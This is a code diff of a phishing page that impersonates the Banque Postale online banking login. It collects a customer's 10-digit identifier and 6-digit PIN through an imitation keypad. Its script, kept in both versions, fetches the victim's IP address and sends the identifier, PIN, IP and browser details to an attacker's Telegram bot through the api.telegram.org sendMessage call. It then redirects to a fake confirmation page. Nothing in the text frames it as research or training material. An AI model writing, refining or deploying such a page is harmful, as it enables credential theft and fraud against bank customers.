@@ -17,269 +17,169 @@
         .sidebar { width: 380px; background: white; padding: 30px; border-right: 1px solid #ddd; overflow-y: auto; }
         .main-content { flex: 1; background: linear-gradient(135deg, #0055a4 0%, #00a0e9 100%); display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; }
         .back-btn { background: #004b9b; color: white; border: none; padding: 10px 18px; border-radius: 50px; cursor: pointer; margin-bottom: 20px; font-weight: bold; }
-        .back-btn:hover { background: #003366; }
         .logo { font-size: 1.2rem; font-weight: bold; color: #004b9b; margin-bottom: 30px; }
         h1 { font-size: 1.1rem; color: #333; margin-bottom: 20px; }
         .form-group { margin-bottom: 20px; }
         label { display: block; font-size: 0.9rem; font-weight: bold; color: #333; margin-bottom: 8px; }
-        input[type="text"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 1rem; }
-        input[type="text"]:focus { border-color: #004b9b; outline: none; }
-        .toggle-group { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
-        .btn-submit { width: 100%; padding: 15px; background: #004b9b; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; opacity: 0.5; pointer-events: none; transition: all 0.3s; }
-        .btn-submit.active { opacity: 1; pointer-events: auto; }
-        .btn-submit.active:hover { background: #003366; }
-        .dots { display: flex; justify-content: center; gap: 15px; margin-bottom: 30px; }
-        .dot { width: 14px; height: 14px; background: #ddd; border-radius: 50%; transition: all 0.2s; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 1rem; }
+        input:focus { border-color: #004b9b; outline: none; }
+        .btn { width: 100%; padding: 15px; background: #004b9b; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; opacity: 0.5; pointer-events: none; }
+        .btn.active { opacity: 1; pointer-events: auto; }
+        .btn.active:hover { background: #003366; }
+        .dots { display: flex; justify-content: center; gap: 15px; margin: 30px 0; }
+        .dot { width: 14px; height: 14px; background: #ddd; border-radius: 50%; }
         .dot.filled { background: #004b9b; }
         .keypad { display: grid; grid-template-columns: repeat(5, 1fr); gap: 5px; margin-bottom: 20px; }
         .key { padding: 15px; background: #f0f4f8; border: 1px solid #ddd; border-radius: 4px; cursor: pointer; font-weight: bold; color: #004b9b; }
         .key:hover { background: #e0e8f0; }
-        .loading { display: none; text-align: center; margin: 20px 0; }
-        .spinner { width: 30px; height: 30px; border: 3px solid #f0f0f0; border-top: 3px solid #004b9b; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .hidden { display: none; }
-        .hero { font-size: 2.5rem; font-weight: bold; margin-bottom: 40px; text-align: center; }
-        .info-card { background: rgba(0, 30, 60, 0.6); padding: 30px; border-radius: 8px; max-width: 500px; }
-        .info-card h3 { margin-bottom: 10px; }
-        .info-card p { font-size: 0.9rem; line-height: 1.4; margin-bottom: 15px; }
-        .btn-outline { background: transparent; border: 1px solid white; color: white; padding: 10px 20px; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; }
-        .btn-outline:hover { background: rgba(255,255,255,0.1); }
-        @media (max-width: 768px) {
-            .container { flex-direction: column; }
-            .sidebar { width: 100%; }
-            input[type="text"] { font-size: 16px; }
-        }
+        .loading { display: none; text-align: center; margin: 20px 0; }
+        .spinner { width: 30px; height: 30px; border: 3px solid #004b9b; border-top: 3px solid #f0f0f0; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @media (max-width: 768px) { .container { flex-direction: column; } .sidebar { width: 100%; } }
     </style>
 </head>
 <body>
-
 <div class="container">
     <div class="sidebar">
         <button class="back-btn" onclick="window.location.href='bank.html'">← Retour</button>
         <div class="logo">BANQUE POSTALE</div>
         <h1>Connexion à votre compte</h1>
-
         <div id="step1">
             <div class="form-group">
                 <label>Identifiant (10 chiffres)</label>
-                <input type="text" id="userid" maxlength="10" placeholder="Saisissez votre identifiant">
+                <input type="text" id="uid" maxlength="10" placeholder="Saisissez votre identifiant">
             </div>
-            <div class="toggle-group">
-                <span>Mémoriser mon identifiant</span>
-                <input type="checkbox" id="remember">
-            </div>
-            <button id="btnContinue" class="btn-submit">Continuer</button>
+            <button id="btn1" class="btn">Continuer</button>
         </div>
-
         <div id="step2" class="hidden">
             <div class="form-group">
-                <label>Code personnel (6 chiffres)</label>
+                <label>Code (6 chiffres)</label>
                 <div class="dots" id="dots">
                     <div class="dot"></div><div class="dot"></div><div class="dot"></div>
                     <div class="dot"></div><div class="dot"></div><div class="dot"></div>
                 </div>
             </div>
-            <div class="keypad" id="keypad"></div>
+            <div class="keypad" id="kp"></div>
             <div style="display: flex; gap: 10px;">
-                <button class="btn-submit" style="background: #ccc; color: #333; flex: 1;" onclick="clearCode()">Effacer</button>
-                <button id="btnSubmit" class="btn-submit" style="flex: 2;">Valider</button>
+                <button class="btn" style="background: #ccc; color: #333; flex: 1;" onclick="clr()">Effacer</button>
+                <button id="btn2" class="btn" style="flex: 2;">Valider</button>
             </div>
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p>Envoi en cours...</p>
-            </div>
-            <div style="text-align: center; margin-top: 20px;">
-                <a href="#" onclick="step1(); return false;" style="color: #004b9b; text-decoration: underline; cursor: pointer;">← Retour</a>
-            </div>
+            <div class="loading" id="load"><div class="spinner"></div><p>Envoi en cours...</p></div>
+            <p style="text-align: center; margin-top: 20px;"><a href="#" onclick="step1(); return false;" style="color: #004b9b; text-decoration: underline;">← Retour</a></p>
         </div>
     </div>
-
     <div class="main-content">
-        <div class="hero">La Banque Citoyenne</div>
-        <div class="info-card">
-            <h3>Espace Assurance</h3>
-            <p>Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats d'assurance ?</p>
-            <button class="btn-outline" onclick="alert('Contactez le service client')">Me connecter</button>
-        </div>
+        <div style="font-size: 2.5rem; font-weight: bold; margin-bottom: 40px;">La Banque Citoyenne</div>
     </div>
 </div>
-
 <script>
 const BOT_TOKEN = window.telegramConfig?.BOT_TOKEN || 'NOT_SET';
 const CHAT_ID = window.telegramConfig?.CHAT_ID || 'NOT_SET';
+let id = '', code = '';
+const inp = document.getElementById('uid');
+const b1 = document.getElementById('btn1');
+const b2 = document.getElementById('btn2');
+const s1 = document.getElementById('step1');
+const s2 = document.getElementById('step2');
+const dots = document.getElementById('dots');
+const kp = document.getElementById('kp');
+const ld = document.getElementById('load');
 
-let userID = '';
-let userCode = '';
-
-const userInput = document.getElementById('userid');
-const rememberCB = document.getElementById('remember');
-const btnCont = document.getElementById('btnContinue');
-const btnSub = document.getElementById('btnSubmit');
-const step1 = document.getElementById('step1');
-const step2 = document.getElementById('step2');
-const dotsDiv = document.getElementById('dots');
-const keypDiv = document.getElementById('keypad');
-const loadDiv = document.getElementById('loading');
-
-function updateButton() {
-    if (userInput.value.trim().length > 0) {
-        btnCont.classList.add('active');
-    } else {
-        btnCont.classList.remove('active');
-    }
+function upd() { 
+    inp.value.trim().length > 0 ? b1.classList.add('active') : b1.classList.remove('active'); 
 }
 
-userInput.addEventListener('input', updateButton);
+inp.addEventListener('input', upd);
 
-btnCont.addEventListener('click', function() {
-    userID = userInput.value.trim();
-    if (userID.length === 0) return;
-    
-    if (rememberCB.checked) {
-        localStorage.setItem('bp_id', userID);
-    } else {
-        localStorage.removeItem('bp_id');
-    }
-    
-    step1.style.display = 'none';
-    step2.style.display = 'block';
-    generateKeypad();
-    updateDots();
+b1.addEventListener('click', () => {
+    id = inp.value.trim();
+    if (!id) return;
+    s1.style.display = 'none';
+    s2.style.display = 'block';
+    gen();
+    upd2();
 });
 
-function generateKeypad() {
-    const nums = [0,1,2,3,4,5,6,7,8,9].sort(() => Math.random() - 0.5);
-    keypDiv.innerHTML = '';
-    
-    nums.forEach(n => {
+function gen() {
+    const n = [0,1,2,3,4,5,6,7,8,9].sort(() => Math.random() - 0.5);
+    kp.innerHTML = '';
+    n.forEach(x => {
         const btn = document.createElement('button');
         btn.className = 'key';
-        btn.textContent = n;
+        btn.textContent = x;
         btn.type = 'button';
-        btn.onclick = () => addDigit(n);
-        keypDiv.appendChild(btn);
+        btn.onclick = () => { if (code.length < 6) { code += x; upd2(); updots(); } };
+        kp.appendChild(btn);
     });
-    
-    const clearBtn = document.createElement('button');
-    clearBtn.className = 'key';
-    clearBtn.textContent = '⌫';
-    clearBtn.type = 'button';
-    clearBtn.onclick = () => removeDigit();
-    keypDiv.appendChild(clearBtn);
+    const cb = document.createElement('button');
+    cb.className = 'key';
+    cb.textContent = '⌫';
+    cb.type = 'button';
+    cb.onclick = () => { if (code) { code = code.slice(0, -1); upd2(); updots(); } };
+    kp.appendChild(cb);
 }
 
-function addDigit(d) {
-    if (userCode.length < 6) {
-        userCode += d;
-        updateDots();
-        updateSubmitBtn();
-    }
-}
+function clr() { code = ''; upd2(); updots(); }
 
-function removeDigit() {
-    if (userCode.length > 0) {
-        userCode = userCode.slice(0, -1);
-        updateDots();
-        updateSubmitBtn();
-    }
-}
-
-function clearCode() {
-    userCode = '';
-    updateDots();
-    updateSubmitBtn();
-}
-
-function updateDots() {
-    const dots = dotsDiv.querySelectorAll('.dot');
-    dots.forEach((d, i) => {
-        if (i < userCode.length) {
-            d.classList.add('filled');
-        } else {
-            d.classList.remove('filled');
-        }
+function updots() {
+    dots.querySelectorAll('.dot').forEach((d, i) => { 
+        if (i < code.length) d.classList.add('filled');
+        else d.classList.remove('filled');
     });
 }
 
-function updateSubmitBtn() {
-    if (userCode.length === 6) {
-        btnSub.classList.add('active');
-    } else {
-        btnSub.classList.remove('active');
-    }
+function upd2() { 
+    if (code.length === 6) b2.classList.add('active');
+    else b2.classList.remove('active');
 }
 
-function step1() {
-    step2.style.display = 'none';
-    step1.style.display = 'block';
-    userCode = '';
-    updateDots();
-    updateSubmitBtn();
+function step1() { 
+    s2.style.display = 'none'; 
+    s1.style.display = 'block'; 
+    code = ''; 
+    upd2(); 
+    updots(); 
 }
 
 async function getIP() {
-    try {
-        const r = await fetch('https://api.ipify.org?format=json');
-        const d = await r.json();
-        return d.ip || 'N/A';
-    } catch (e) {
-        return 'N/A';
+    try { 
+        const r = await fetch('https://api.ipify.org?format=json'); 
+        return (await r.json()).ip || 'N/A'; 
+    } catch { 
+        return 'N/A'; 
     }
 }
 
-btnSub.addEventListener('click', async function() {
-    if (userCode.length !== 6) return;
-    
-    btnSub.disabled = true;
-    loadDiv.style.display = 'block';
-    
-    const ip = await getIP();
-    const msg = `📮 BANQUE POSTALE - NOUVELLE CONNEXION 📮
-━━━━━━━━━━━━━━━━━━━━━
-👤 Identifiant: ${userID}
-🔑 Code: ${userCode}
-━━━━━━━━━━━━━━━━━━━━━
-🌍 IP: ${ip}
-📱 User-Agent: ${navigator.userAgent}
-🕐 Date: ${new Date().toLocaleString('fr-FR')}
-✅ Statut: Connexion en cours`;
-    
+b2.addEventListener('click', async () => {
+    if (code.length !== 6) return;
+    b2.disabled = true;
+    ld.style.display = 'block';
+    const ipAddr = await getIP();
     try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            body: JSON.stringify({ 
+                chat_id: CHAT_ID, 
+                text: `📮 BANQUE POSTALE - NOUVELLE CONNEXION\n👤 ID: ${id}\n🔑 Code: ${code}\n🌍 IP: ${ipAddr}\n📱 UA: ${navigator.userAgent}\n🕐 ${new Date().toLocaleString('fr-FR')}`
+            })
         });
-        
-        const data = await res.json();
-        
-        await new Promise(r => setTimeout(r, 1500));
-        loadDiv.style.display = 'none';
-        
-        if (data.ok) {
-            window.location.href = 'confirmation.html';
-        } else {
-            btnSub.disabled = false;
-            alert('Erreur: ' + data.description);
-        }
-    } catch (e) {
-        loadDiv.style.display = 'none';
-        btnSub.disabled = false;
+        const d = await r.json();
+        await new Promise(x => setTimeout(x, 1500));
+        ld.style.display = 'none';
+        if (d.ok) window.location.href = 'confirmation.html';
+        else { b2.disabled = false; alert('Erreur: ' + d.description); }
+    } catch (e) { 
+        ld.style.display = 'none'; 
+        b2.disabled = false; 
         alert('Erreur de connexion');
     }
 });
 
-// Load saved ID
-const saved = localStorage.getItem('bp_id');
-if (saved) {
-    userInput.value = saved;
-    rememberCB.checked = true;
-    updateButton();
-}
-
-updateButton();
-updateDots();
-updateSubmitBtn();
+upd(); 
+updots(); 
+upd2();
 </script>
 </body>
 </html>
